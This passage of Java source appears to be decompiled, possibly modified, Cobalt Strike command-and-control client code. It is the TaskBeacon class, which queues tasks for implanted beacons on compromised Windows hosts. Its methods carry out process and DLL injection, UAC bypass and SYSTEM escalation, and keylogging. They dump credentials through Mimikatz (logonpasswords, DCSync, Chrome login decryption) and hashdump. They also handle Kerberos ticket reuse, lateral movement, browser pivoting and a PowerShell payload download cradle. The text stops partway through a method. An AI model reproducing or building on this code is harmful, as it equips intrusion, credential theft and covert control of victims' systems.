package beacon;


import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import beacon.bof.BypassUACToken;
import beacon.bof.DllLoad;
import beacon.bof.GetSystem;
import beacon.bof.KerberosTicketPurge;
import beacon.bof.KerberosTicketUse;
import beacon.bof.NetDomain;
import beacon.bof.PsExecCommand;
import beacon.bof.RegistryQuery;
import beacon.bof.Timestomp;
import beacon.bof.UserSpecified;
import beacon.bof.arp;
import beacon.bof.cat;
import beacon.bof.env;
import beacon.bof.ipconfig;
import beacon.bof.netstat;
import beacon.bof.openport;
import beacon.bof.pythonBOF;
import beacon.bof.routeprint;
import beacon.bof.screenshotp;
import beacon.bof.syscalls_inject;
import beacon.bof.syscalls_shinject;
import beacon.bof.uac2;
import beacon.bof.uacscan;
import beacon.bof.uacsspi;
import beacon.bof.whoami;
import beacon.jobs.DesktopJob;
import beacon.jobs.DllSpawnJob;
import beacon.jobs.ExecuteAssemblyJob;
import beacon.jobs.HashdumpJob;
import beacon.jobs.KeyloggerJob;
import beacon.jobs.MimikatzJob;
import beacon.jobs.MimikatzJobSmall;
import beacon.jobs.NetViewJob;
import beacon.jobs.PortScannerJob;
import beacon.jobs.PowerShellJob;
import beacon.jobs.SSHAgentJob;
import beacon.jobs.ScreenshotJob;
import beacon.setup.BrowserPivot;
import bean.CobaltstrikeBean;
import common.ArtifactUtils;
import common.AssertUtils;
import common.BeaconEntry;
import common.BeaconOutput;
import common.ByteIterator;
import common.CommonUtils;
import common.DevLog;
import common.ListenerUtils;
import common.MudgeSanity;
import common.PowerShellUtils;
import common.ReflectiveDLL;
import common.ResourceUtils;
import common.ScListener;
import common.Shellcode;
import common.TeamQueue;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Stack;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import common.VPNClient;
import dialog.DialogUtils;
import kerberos.KerberosUtils;
import pe.PEParser;
import pe.ThreadFix;
import server.Resources;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;


public class TaskBeacon {
	CobaltstrikeBean cobaltstrike = CobaltstrikeBean.getInstance();
	protected Resources resources;
	protected GlobalDataManager gdata;
	protected String[] bids;
	protected TeamQueue conn;
	protected EncodedCommandBuilder builder;
	protected DataManager data;
	protected AggressorClient client;
	protected boolean silent;
	private static Pattern A = null;


	public AggressorClient getClient() {
		return this.client;
	}


	public void silent() {
		this.silent = true;
	}


	public String getPostExPipeName(String var1) {
		return DataUtils.getPostExPipeName(this.client.getData(), var1);
	}

	public ThreadFix getThreadFix() {
		return new ThreadFix(DataUtils.getProfile(this.client.getData()));

	}


	public boolean disableAMSI() {
		return DataUtils.disableAMSI(this.data);

	}


	public boolean obfuscatePostEx() {
		return DataUtils.obfuscatePostEx(this.data);

	}


	public boolean useSmartInject() {
		return DataUtils.useSmartInject(this.data);

	}


	public String arch(String var1) {
		BeaconEntry var2 = DataUtils.getBeacon(this.data, var1);

		return (var2 != null) ? var2.arch() : "x86";

	}


	public TaskBeacon(AggressorClient var1, String[] var2) {
		this(var1, var1.getData(), var1.getConnection(), var2);

	}


	public TaskBeacon(AggressorClient var1, DataManager var2, TeamQueue var3, String[] var4) {
		this.gdata = GlobalDataManager.getGlobalDataManager();

		this.builder = null;

		this.silent = false;

		this.client = var1;

		this.bids = var4;

		this.conn = var3;

		this.data = var2;

		this.builder = new EncodedCommandBuilder(var1);

	}


	public String getMimikatzDLL(String var1, String var2) {
		String var3 = this.client.getScriptEngine().format("MIMIKATZ_INTERNAL", CommonUtils.scalar(var1, var2));

		if (var3 != null && !"".equals(var3)) {
			File var4 = new File(var3);

			if (!var4.exists()) {
				CommonUtils.print_error("Script MIMIKATZ_INTERNAL is defined; but " + var3 + " does not exist. Using built-ins");

				return null;

			}

			return var3;

		}


		return null;

	}


	public String getPsExecService() {
		String var1 = this.client.getScriptEngine().format("PSEXEC_SERVICE", new Stack());

		return (var1 != null && !"".equals(var1)) ? var1 : CommonUtils.garbage("service");

	}


	public void whitelistPort(String var1, int var2) {
		this.conn.call("beacons.whitelist_port", CommonUtils.args(var1, Integer.valueOf(var2)));

	}


	public void log_task(String var1, String var2) {
		log_task(var1, var2, "");

	}


	public void log_task(String var1, String var2, String var3) {
		if (!this.silent) {
			this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Task(var1, var2, var3)));

		}

	}


	public void input(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(this.bids[var2], var1)));

		}

	}


	public void log(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Output(this.bids[var2], var1)));

		}

	}


	public void log2(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.OutputB(this.bids[var2], var1)));

		}

	}


	public void error(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			error(this.bids[var2], var1);

		}

	}


	public void error(String var1, String var2) {
		this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(var1, var2)));

	}


	public void task(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], var1, var2);

		}

	}


	public void task(String var1, byte[] var2, String var3) {
		task(var1, var2, var3, "");

	}


	public void task(String var1, byte[] var2, String var3, String var4) {
		log_task(var1, var3, var4);

		this.conn.call("beacons.task", CommonUtils.args(var1, var2));

	}


	public void task(String var1, byte[] var2, byte[] var3, String var4, String var5) {
		log_task(var1, var4, var5);

		this.conn.call("beacons.task", CommonUtils.args(var1, var2));

		this.conn.call("beacons.task", CommonUtils.args(var1, var3));

	}


	protected void taskNoArgs(int var1, String var2) {
		taskNoArgs(var1, var2, "");

	}


	protected void taskNoArgs(int var1, String var2, String var3) {
		this.builder.setCommand(var1);

		byte[] var4 = this.builder.build();


		for (int var5 = 0; var5 < this.bids.length; var5++) {
			log_task(this.bids[var5], var2, var3);

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));

		}

	}


	protected void taskNoArgsCallback(int var1, String var2) {
		taskNoArgsCallback(var1, var2, "");

	}


	protected void taskNoArgsCallback(int var1, String var2, String var3) {
		this.builder.setCommand(var1);

		this.builder.addInteger(0);

		byte[] var4 = this.builder.build();


		for (int var5 = 0; var5 < this.bids.length; var5++) {
			log_task(this.bids[var5], var2, var3);

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));

		}

	}


	protected void taskOneArg(int var1, String var2, String var3) {
		taskOneArg(var1, var2, var3, "");

	}


	protected void taskOneArg(int var1, String var2, String var3, String var4) {
		this.builder.setCommand(var1);

		this.builder.addString(var2);

		byte[] var5 = this.builder.build();


		for (int var6 = 0; var6 < this.bids.length; var6++) {
			log_task(this.bids[var6], var3, var4);

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));

		}

	}


	protected void taskOneEncodedArg(int var1, String var2, String var3, String var4) {
		for (int var5 = 0; var5 < this.bids.length; var5++) {
			this.builder.setCommand(var1);

			this.builder.addEncodedString(this.bids[var5], var2);

			byte[] var6 = this.builder.build();

			log_task(this.bids[var5], var3, var4);

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var6));

		}

	}


	protected void taskOneArgI(int var1, int var2, String var3) {
		taskOneArgI(var1, var2, var3, "");

	}


	protected void taskOneArgI(int var1, int var2, String var3, String var4) {
		this.builder.setCommand(var1);

		this.builder.addInteger(var2);

		byte[] var5 = this.builder.build();


		for (int var6 = 0; var6 < this.bids.length; var6++) {
			log_task(this.bids[var6], var3, var4);

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));

		}

	}


	protected void taskOneArgS(int var1, int var2, String var3) {
		taskOneArgS(var1, var2, var3, "");

	}


	protected void taskOneArgS(int var1, int var2, String var3, String var4) {
		this.builder.setCommand(var1);

		this.builder.addShort(var2);

		byte[] var5 = this.builder.build();


		for (int var6 = 0; var6 < this.bids.length; var6++) {
			log_task(this.bids[var6], var3, var4);

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));

		}

	}


	public String cmd_sanity(String var1, String var2) {
		if (var1.length() > 8191) {
			CommonUtils.print_error(var2 + " command is " + var2 + " bytes. This exceeds the 8191 byte command-line string limitation in Windows. This action will fail. Likely, your Resource Kit script is generating a script that is too large. Optimize your templates for size.");

		}


		return var1;

	}


	public String checkProcessInjectExplicitHook(String var1, byte[] var2, int var3, int var4, String var5) {
		Stack<Scalar> var6 = new Stack();

		var6.push(SleepUtils.getScalar(var5));

		var6.push(SleepUtils.getScalar(var4));

		var6.push(SleepUtils.getScalar(var3));

		var6.push(SleepUtils.getScalar(var2));

		var6.push(SleepUtils.getScalar(var1));

		return this.client.getScriptEngine().format("PROCESS_INJECT_EXPLICIT", var6);

	}


	public void BrowserPivot(int var1, String var2) {
		String[] var3 = this.bids;

		int var4 = var3.length;


		for (int var5 = 0; var5 < var4; var5++) {
			String var6 = var3[var5];

			BrowserPivot(var6, var1, var2, CommonUtils.randomPort());

		}

	}


	public void BrowserPivot(String var1, int var2, String var3, int var4) {
		int var5 = CommonUtils.randomPort();

		byte[] var6 = (new BrowserPivot(this, var5, var3.equals("x64"))).export();

		String var7 = checkProcessInjectExplicitHook(var1, var6, var2, 0, var3);

		if (CommonUtils.isNullOrEmpty(var7)) {
			this.builder.setCommand(var3.equals("x64") ? 43 : 9);

			this.builder.addInteger(var2);

			this.builder.addInteger(0);

			this.builder.addString(CommonUtils.bString(var6));

			this.builder.pad(var6.length, 1024);

			byte[] var8 = this.builder.build();

			this.conn.call("beacons.task", CommonUtils.args(var1, var8));

		}


		log_task(var1, "Injecting browser pivot DLL into " + var2 + " (" + var3 + ")", "T1111, T1055, T1185");

		this.conn.call("browserpivot.start", CommonUtils.args(var1, "" + var4, "" + var5));

		GoInteractive(var1);

		this.conn.call("beacons.portfwd", CommonUtils.args(var1, "127.0.0.1", Integer.valueOf(var5)));

	}


	public void BrowserPivotStop() {
		String[] var1 = this.bids;

		int var2 = var1.length;


		for (int var3 = 0; var3 < var2; var3++) {
			String var4 = var1[var3];

			this.conn.call("browserpivot.stop", CommonUtils.args(var4));

		}

	}


	public void BypassUACToken(String var1) {
		ScListener var2 = ListenerUtils.getListener(this.client, var1);


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			BypassUACToken(this.bids[var3], var2);

		}


		linkToPayloadLocal(var2);

	}


	public void BypassUACToken(String var1, ScListener var2) {
		String var3 = "BypassUACToken";

		DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, getClass(), var3, "001");

		String var4 = arch(var1);

		byte[] var5 = var2.exportLocal(this.client, var1, var4);

		log_task(var1, "Tasked beacon to spawn " + var2 + " in a high integrity process (token duplication)", "T1088, T1093");

		(new BypassUACToken(this.client, var5, var4)).go(var1);

	}


	public String SetupPayloadDownloadCradle(String var1, ScListener var2) {
		return SetupPayloadDownloadCradle(var1, arch(var1), var2);

	}


	public String SetupPayloadDownloadCradle(String var1, String var2, ScListener var3) {
		String var4 = "SetupPayloadDownloadCradle";

		DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, getClass(), var4, "001");

		byte[] var5 = var3.export(this.client, var2);

		byte[] var6 = (new ResourceUtils(this.client)).buildPowerShell(var5, "x64".equals(var2));

		int var7 = CommonUtils.randomPort();

		String var8 = (new PowerShellUtils(this.client)).format((new PowerShellUtils(this.client)).PowerShellDownloadCradle("http://127.0.0.1:" + var7 + "/"), false);

		this.builder.setCommand(59);

		this.builder.addShort(var7);

		this.builder.addString(var6);

		byte[] var9 = this.builder.build();

		this.conn.call("beacons.task", CommonUtils.args(var1, var9));

		return var8;

	}


	public void Checkin() {
		taskNoArgs(8, "Tasked beacon to checkin");

	}


	public void ChromeDump(int var1, String var2) {
		Mimikatz("dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect", var1, var2);

	}


	public void Cancel(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			log_task(this.bids[var2], "Tasked " + CommonUtils.session(this.bids[var2]) + " to cancel downloads that match " + var1);

			this.conn.call("beacons.download_cancel", CommonUtils.args(this.bids[var2], var1));

		}

	}


	public void Cd(String var1) {
		taskOneEncodedArg(5, var1, "cd " + var1, "");

	}


	public void Clear() {
		for (int var1 = 0; var1 < this.bids.length; var1++) {
			log_task(this.bids[var1], "Cleared " + CommonUtils.session(this.bids[var1]) + " queue");

			this.conn.call("beacons.clear", CommonUtils.args(this.bids[var1]));

		}

	}


	public void Connect(String var1) {
		Connect(var1, DataUtils.getProfile(this.client.getData()).getInt(".tcp_port"));

	}


	public void Connect(String var1, int var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], "Tasked to connect to " + var1 + ":" + var2, "T1090");

			ConnectExplicit(this.bids[var3], var1, var2);

		}

	}


	public void ConnectExplicit(String var1, String var2, int var3) {
		this.builder.setCommand(86);

		this.builder.addShort(var3);

		this.builder.addStringASCIIZ(var2);

		this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));

	}


	public String file_to_tactic(String var1) {
		var1 = var1.toLowerCase();

		return (!var1.startsWith("\\\\") || (!CommonUtils.isin("\\C$", var1) && !CommonUtils.isin("\\ADMIN$", var1))) ? "" : "T1077";

	}


	public void BlockDLLs(boolean var1) {
		if (var1) {
			taskOneArgI(92, 1, "Tasked beacon to block non-Microsoft binaries in child processes", "T1106");

		}
		else {

			taskOneArgI(92, 0, "Tasked beacon to not block non-Microsoft binaries in child processes", "T1106");

		}

	}


	public void Copy(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			this.builder.setCommand(73);

			this.builder.addLengthAndEncodedString(this.bids[var3], var1);

			this.builder.addLengthAndEncodedString(this.bids[var3], var2);

			byte[] var4 = this.builder.build();

			log_task(this.bids[var3], "Tasked beacon to copy " + var1 + " to " + var2, file_to_tactic(var2));

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var4));

		}

	}


	public void CovertVPN(String var1, String var2, String var3, String var4) {
		BeaconEntry var5 = DataUtils.getBeacon(this.data, var1);

		if (var5 != null && var5.getVersion() >= 10.0D) {
			error("CovertVPN is not compatible with Windows 10");

		}
		else {

			Map var6 = DataUtils.getInterface(this.data, var2);

			if (var6.size() == 0) {
				error("No interface " + var2);

			}
			else {

				if (var4 != null) {
					this.conn.call("cloudstrike.set_tap_hwaddr", CommonUtils.args(var2, var4));

				}


				String var7 = DataUtils.getLocalIP(this.data);

				HashSet var8 = new HashSet(DataUtils.getBeaconChain(this.data, var1));

				byte[] var9 = VPNClient.exportClient(var7, var3, var6, var8);

				if (var9.length != 0) {
					var9 = ReflectiveDLL.patchDOSHeader(var9);

					if ("TCP (Bind)".equals(var6.get("channel"))) {
						GoInteractive(var1);

						this.conn.call("beacons.portfwd", CommonUtils.args(var1, "127.0.0.1", var6.get("port")));

					}


					taskOneArg(1, CommonUtils.bString(var9), "Tasked beacon to deploy Covert VPN for " + var2, "T1093");

				}

			}

		}

	}


	public void CovertVPN(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			CovertVPN(this.bids[var3], var1, var2, (String) null);

		}

	}


	public void DcSync(String var1, String var2, int var3, String var4) {
		MimikatzSmall("@lsadump::dcsync /domain:" + var1 + " /user:" + var2, var3, var4);

	}


	public void DcSync(String var1, int var2, String var3) {
		MimikatzSmall("@lsadump::dcsync /domain:" + var1 + " /all /csv", var2, var3);

	}


	public void Desktop(boolean var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			GoInteractive(this.bids[var2]);

			if (this.cobaltstrike.getInjectSelf().booleanValue()) {
				BeaconEntry var3 = DataUtils.getBeacon(this.data, this.bids[var2]);

				int PID = CommonUtils.toNumber(var3.getPid(), 0);

				log_task(this.bids[var2], "Tasked beacon to Desktop inject " + PID + " :cat edit.", "T1106");

				(new DesktopJob(this)).inject(this.bids[var2], PID, arch(this.bids[var2]), var1);

			}
			else {

				(new DesktopJob(this)).spawn(this.bids[var2], arch(this.bids[var2]), var1);

			}

		}

	}


	public void Desktop(int var1, String var2, boolean var3) {
		for (int var4 = 0; var4 < this.bids.length; var4++) {
			GoInteractive(this.bids[var4]);

			(new DesktopJob(this)).inject(this.bids[var4], var1, var2, var3);

		}

	}


	public void Die() {
		this.builder.setCommand(3);

		byte[] var1 = this.builder.build();


		for (int var2 = 0; var2 < this.bids.length; var2++) {
			BeaconEntry var3 = DataUtils.getBeacon(this.data, this.bids[var2]);

			log_task(this.bids[var2], "Tasked " + CommonUtils.session(this.bids[var2]) + " to exit");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var2], var1));

		}

	}


	public void DllInject(int var1, String var2) {
		byte[] var3 = CommonUtils.readFile(var2);

		int var4 = ReflectiveDLL.findReflectiveLoader(var3);

		if (var4 <= 0) {
			error("Could not find reflective loader in " + var2);

		}
		else {

			String var5 = "x86";

			byte var6 = 9;

			if (ReflectiveDLL.is64(var3)) {
				var6 = 43;

				var5 = "x64";

			}


			this.builder.setCommand(var6);

			this.builder.addInteger(var1);

			this.builder.addInteger(var4);

			this.builder.addString(CommonUtils.bString(var3));

			byte[] var7 = this.builder.build();

			String[] var8 = this.bids;

			int var9 = var8.length;


			for (int var10 = 0; var10 < var9; var10++) {
				String var11 = var8[var10];

				String var12 = checkProcessInjectExplicitHook(var11, var3, var1, var4, var5);

				if (CommonUtils.isNullOrEmpty(var12)) {
					this.conn.call("beacons.task", CommonUtils.args(var11, var7));

				}


				log_task(var11, "Tasked beacon to inject " + var2 + " into " + var1, "T1055");

			}

		}

	}


	public void DllLoad(int var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			DllLoad(this.bids[var3], var1, var2);

		}

	}


	public void DllLoad(String var1, int var2, String var3) {
		log_task(var1, "Tasked beacon to load " + var3 + " into " + var2, "T1055");

		(new DllLoad(this.client, var2, var3)).go(var1);

	}


	public void DllSpawn(String var1, String var2, String var3, int var4, boolean var5) {
		if (var3.length() > 60) {
			var3 = var3.substring(0, 60);

		}


		DllSpawnJob var6 = new DllSpawnJob(this, var1, var2, var3, var4, var5);


		for (int var7 = 0; var7 < this.bids.length; var7++) {
			var6.spawn(this.bids[var7]);

		}

	}


	public void Download(String var1) {
		if (this.bids.length > 0) {
			if (var1.startsWith("\\\\")) {
				taskOneEncodedArg(11, var1, "Tasked " + CommonUtils.session(this.bids[0]) + " to download " + var1, "T1039");

			}
			else {

				taskOneEncodedArg(11, var1, "Tasked " + CommonUtils.session(this.bids[0]) + " to download " + var1, "T1005");

			}

		}

	}


	public void Drives() {
		for (int var1 = 0; var1 < this.bids.length; var1++) {
			log_task(this.bids[var1], "Tasked beacon to list drives");

			this.conn.call("beacons.task_drives_default", CommonUtils.args(this.bids[var1]));

		}

	}


	public void Elevate(String var1, String var2) {
		BeaconExploits.Exploit var3 = DataUtils.getBeaconExploits(this.data).getExploit(var1);


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			var3.elevate(this.bids[var4], var2);

		}

	}


	public void ElevateCommand(String var1, String var2) {
		BeaconElevators.Elevator var3 = DataUtils.getBeaconElevators(this.data).getCommandElevator(var1);


		for (int var4 = 0; var4 < this.bids.length; var4++) {
			var3.runasadmin(this.bids[var4], var2);

		}

	}


	public void Execute(String var1) {
		taskOneEncodedArg(12, var1, "Tasked beacon to execute: " + var1, "T1106");

	}


	public void ExecuteAssembly(String var1, String var2) {
		PEParser var3 = PEParser.load(CommonUtils.readFile(var1));

		if (!var3.isProcessAssembly()) {
			error("File " + var1 + " is not a process assembly (.NET EXE)");

		}
		else {

			for (int var4 = 0; var4 < this.bids.length; var4++) {
				BeaconEntry var5 = DataUtils.getBeacon(this.data, this.bids[var4]);

				if (var5.is64()) {
					(new ExecuteAssemblyJob(this, var1, var2, "x64")).spawn(this.bids[var4]);

				}
				else {

					(new ExecuteAssemblyJob(this, var1, var2, "x86")).spawn(this.bids[var4]);

				}

			}

		}

	}


	public void GetPrivs() {
		GetPrivs("SeDebugPrivilege, SeTcbPrivilege, SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeLockMemoryPrivilege, SeIncreaseQuotaPrivilege, SeUnsolicitedInputPrivilege, SeMachineAccountPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeSystemProfilePrivilege, SeSystemtimePrivilege, SeProfileSingleProcessPrivilege, SeIncreaseBasePriorityPrivilege, SeCreatePagefilePrivilege, SeCreatePermanentPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeShutdownPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeChangeNotifyPrivilege, SeRemoteShutdownPrivilege, SeUndockPrivilege, SeSyncAgentPrivilege, SeEnableDelegationPrivilege, SeManageVolumePrivilege");

	}


	public void GetPrivs(String var1) {
		this.builder.setCommand(77);

		this.builder.addStringArray(CommonUtils.toArray(var1));

		byte[] var2 = this.builder.build();


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], "Tasked beacon to enable privileges", "T1134");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));

		}

	}


	public void GetSystem() {
		for (int var1 = 0; var1 < this.bids.length; var1++) {
			GetSystem(this.bids[var1]);

		}

	}


	public void GetSystem(String var1) {
		log_task(var1, "Tasked beacon to get SYSTEM", "T1134");

		(new GetSystem(this.client)).go(var1);

	}


	public void GetUID() {
		taskNoArgs(27, "Tasked beacon to get userid");

	}


	public void Hashdump() {
		String[] var1 = this.bids;

		int var2 = var1.length;


		for (int var3 = 0; var3 < var2; var3++) {
			String var4 = var1[var3];

			BeaconEntry var5 = DataUtils.getBeacon(this.data, var4);

			if (this.cobaltstrike.getInjectSelf().booleanValue()) {
				int PID = CommonUtils.toNumber(var5.getPid(), 0);

				log_task(var4, "Tasked beacon to HashDump inject " + PID + " :cat edit.", "T1106");

				(new HashdumpJob(this)).inject(var4, PID, var5.arch());

			}
			else {

				(new HashdumpJob(this)).spawn(var4, var5.is64() ? "x64" : "x86");

			}

		}

	}


	public void Hashdump(int var1, String var2) {
		String[] var3 = this.bids;

		int var4 = var3.length;


		for (int var5 = 0; var5 < var4; var5++) {
			String var6 = var3[var5];

			(new HashdumpJob(this)).inject(var6, var1, var2);

		}

	}


	public void Inject(String var1, int var2, String var3, String var4) {
		AssertUtils.TestPID(var2);

		AssertUtils.TestSetValue(var4, "x86, x64");

		ScListener var5 = ListenerUtils.getListener(this.client, var3);

		String var6 = "Inject";

		DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, getClass(), var6, "002");

		byte[] var7 = var5.exportLocal(this.client, var1, var4, 1);

		String var8 = checkProcessInjectExplicitHook(var1, var7, var2, 0, var4);

		if (CommonUtils.isNullOrEmpty(var8)) {
			this.builder.setCommand(var4.equals("x64") ? 43 : 9);

			this.builder.addInteger(var2);

			this.builder.addInteger(0);

			this.builder.addString(CommonUtils.bString(var7));

			byte[] var9 = this.builder.build();

			this.conn.call("beacons.task", CommonUtils.args(var1, var9));

		}


		log_task(var1, "Tasked beacon to inject " + var5 + " into " + var2 + " (" + var4 + ")", "T1055");

		linkToPayloadLocal(var5);

	}


	public void Inject(int var1, String var2, String var3) {
		String[] var4 = this.bids;

		int var5 = var4.length;


		for (int var6 = 0; var6 < var5; var6++) {
			String var7 = var4[var6];

			Inject(var7, var1, var2, var3);

		}

	}


	public void InlineExecuteObject(String var1, String var2) {
		for (int var3 = 0; var3 < this.bids.length; var3++) {
			BeaconEntry var4 = DataUtils.getBeacon(this.data, this.bids[var3]);

			if (var4 != null) {
				InlineExecuteObject(this.bids[var3], var1, var2, var4.arch());

			}

		}

	}


	public void InlineExecuteObject(String var1, String var2, String var3, String var4) {
		UserSpecified var5 = new UserSpecified(this, this.client, var2, var3);

		log_task(var1, "Tasked beacon to inline-execute " + var2);

		var5.go(var1);

	}


	public void JobKill(int var1) {
		this.builder.setCommand(42);

		this.builder.addShort(var1);

		byte[] var2 = this.builder.build();


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], "Tasked beacon to kill job " + var1);

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));

		}

	}


	public void Jobs() {
		taskNoArgs(41, "Tasked beacon to list jobs");

	}


	public void Jump(String var1, String var2, String var3) {
		BeaconRemoteExploits.RemoteExploit var4 = DataUtils.getBeaconRemoteExploits(this.data).getRemoteExploit(var1);


		for (int var5 = 0; var5 < this.bids.length; var5++) {
			var4.jump(this.bids[var5], var2, var3);

		}

	}


	public void KerberosTicketPurge() {
		for (int var1 = 0; var1 < this.bids.length; var1++) {
			log_task(this.bids[var1], "Tasked beacon to purge kerberos tickets", "T1097");

			(new KerberosTicketPurge(this.client)).go(this.bids[var1]);

		}

	}


	public void KerberosTicketUse(String var1) {
		byte[] var2 = CommonUtils.readFile(var1);


		for (int var3 = 0; var3 < this.bids.length; var3++) {
			log_task(this.bids[var3], "Tasked beacon to apply ticket in " + var1, "T1097");

			(new KerberosTicketUse(this.client, var2)).go(this.bids[var3]);

		}

	}


	public void KerberosCCacheUse(String var1) {
		byte[] var2 = KerberosUtils.ConvertCCacheToKrbCred(var1);

		if (var2.length == 0) {
			error("Could not extract ticket from " + var1);

		}
		else {

			for (int var3 = 0; var3 < this.bids.length; var3++) {
				log_task(this.bids[var3], "Tasked beacon to extract and apply ticket from " + var1, "T1097");

				(new KerberosTicketUse(this.client, var2)).go(this.bids[var3]);

			}

		}

	}


	public KeyloggerJob getKeylogger() {
		String var1 = DataUtils.getProfile(this.client.getData()).getString(".post-ex.keylogger");

		if ("GetAsyncKeyState".equals(var1))
			return KeyloggerJob.KeyloggerGetAsyncKeyState(this);

		if ("SetWindowsHookEx".equals(var1)) {
			return KeyloggerJob.KeyloggerSetWindowsHookEx(this);

		}

		CommonUtils.print_error("Unknown keystroke logger method '" + var1 + "'");

		return null;

	}


	public void KeyLogger() {
		String[] var1 = this.bids;

		int var2 = var1.length;


		for (int var3 = 0; var3 < var2; var3++) {
			String var4 = var1[var3];

			BeaconEntry var5 = DataUtils.getBeacon(this.data, var4);

			if (this.cobaltstrike.getInjectSelf().booleanValue()) {
				if (var5 != null) {
					int PID = CommonUtils.toNumber(var5.getPid(), 0);

					log_task(var4, "Tasked beacon to Keylogger inject " + PID + " :cat edit.", "T1106");


					getKeylogger().inject(var4, PID, var5.arch());

				}

			}
			else if (var5 != null) {
				getKeylogger().spawn(var4, var5.arch());

			}

		}

	}


	public void KeyLogger(int var1, String var2) {
		String[] var3 = this.bids;

		int var4 = var3.length;


		for (int var5 = 0; var5 < var4; var5++) {
			String var6 = var3[var5];

			getKeylogger().inject(var6, var1, var2);

		}

	}


	public void Kill(int var1) {
		taskOneArgI(33, var1, "Tasked beacon to kill " + var1);

	}


	public void Link(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			log_task(this.bids[var2], "Tasked to link to " + var1, "T1090");

			LinkExplicit(this.bids[var2], var1);

		}

	}


	public void LinkExplicit(String var1, String var2) {
		this.builder.setCommand(68);

		this.builder.addStringASCIIZ(var2);

		this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));

	}


	public void LoginUser(String var1, String var2, String var3) {
		for (int var4 = 0; var4 < this.bids.length; var4++) {
			this.builder.setCommand(49);

			this.builder.addLengthAndEncodedString(this.bids[var4], var1);

			this.builder.addLengthAndEncodedString(this.bids[var4], var2);

			this.builder.addLengthAndEncodedString(this.bids[var4], var3);

			byte[] var5 = this.builder.build();

			log_task(this.bids[var4], "Tasked beacon to create a token for " + var1 + "\\" + var2, "T1134");

			this.conn.call("beacons.task", CommonUtils.args(this.bids[var4], var5));

		}

	}


	public void LogonPasswords(int var1, String var2) {
		MimikatzSmall("sekurlsa::logonpasswords", var1, var2);

	}


	public void Ls(String var1) {
		for (int var2 = 0; var2 < this.bids.length; var2++) {
			if (var1.startsWith("\\\\") && var1.endsWith("$")) {
				log_task(this.bids[var2], "Tasked beacon to list files in " + var1, "T1077");

			}
			else {

				log_task(this.bids[var2], "Tasked beacon to list files in " + var1);

			}


			String var3 = CommonUtils.bString(DataUtils.encodeForBeacon(this.data, this.bids[var2], var1));

			this.conn.call("beacons.task_ls_default", CommonUtils.args(this.bids[var2], var3));

		}

	}


	public void Message(String var1) {
	}


	public void Mimikatz(String var1, int var2, String var3) {
		boolean var4 = (var2 >= 0 && CommonUtils.contains("x86, x64", var3));

		String[] var5 = this.bids;

		int var6 = var5.length;


		for (int var7 = 0; var7 < var6; var7++) {
			String var8 = var5[var7];

			BeaconEntry var9 = DataUtils.getBeacon(this.data, var8);

			if (var9 != null) {
				String var10 = var9.is64() ? "x64" : "x86";

				if (var4) {
					if (var10.equals(var3)) {
						(new MimikatzJob(this, var1)).inject(var8, var2, var3);

					}
					else {

						error(var8, "Do not inject into a " + var3 + " process when running on a " + var10 + " system.");

					}

				}
				else {

					(new MimikatzJob(this, var1)).spawn(var8, var10);

				}

			}

		}

	}


	public void MimikatzSmall(String var1, int var2, String var3) {
		boolean var4 = (var2 >= 0 && CommonUtils.contains("x86, x64", var3));

		String[] var5 = this.bids;

		int var6 = var5.length;


		for (int var7 = 0; var7 < var6; var7++) {
			String var8 = var5[var7];

			BeaconEntry var9 = DataUtils.getBeacon(this.data, var8);

			if (var9 != null) {
				String var10 = var9.is64() ? "x64" : "x86";

				if (var4) {
					if (var10.equals(var3)) {
